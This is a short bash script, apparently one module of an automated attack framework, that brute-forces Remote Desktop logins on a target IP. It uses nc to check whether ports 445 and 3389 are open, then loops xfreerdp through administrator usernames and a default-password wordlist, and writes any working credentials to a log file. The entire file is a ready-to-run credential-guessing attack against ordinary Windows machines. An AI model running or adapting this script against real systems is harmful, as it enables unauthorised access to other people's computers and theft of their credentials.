#!/bin/bash
# Args: $1=IP  $2=MAC  $3=ATTACKER_IP
# Env:  KARMA_OUT

WAIT=2
DPORT=3389
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
WORDLIST="$SCRIPT_DIR/default_pass_for_services_unhash.txt"
TIME="$(date +'%H:%M:%S_%d.%m.%Y')"
OUT="${KARMA_OUT:-$SCRIPT_DIR/../..}"
mkdir -p "$OUT"
OUTFILE="$OUT/rdp-brute-${1}_${TIME}.txt"

# Skip if SMB is open (smb.sh already handles Windows machines with SMB)
if nc -nw $WAIT "$1" 445 </dev/null 2>/dev/null; then
	exit 0
fi

if ! nc -nw $WAIT "$1" $DPORT </dev/null 2>/dev/null; then
	exit 0
fi

echo "[*] bruteforcing RDP on $1" | tee "$OUTFILE"

for user in administrator admin Administrator Администратор; do
	while IFS= read -r password; do
		if xfreerdp /v:"$1":$DPORT /u:"$user" /p:"$password" \
			/cert-ignore +auth-only /sec:nla /log-level:OFF >/dev/null 2>/dev/null; then
			echo "[+] RDP FOUND: $1  user=$user  pass=$password" | tee -a "$OUTFILE"
			break 2
		fi
	done < "$WORDLIST"
done

if ! grep -q '\[+\]' "$OUTFILE"; then
	echo "[-] RDP brute: no credentials found on $1" | tee -a "$OUTFILE"
fi
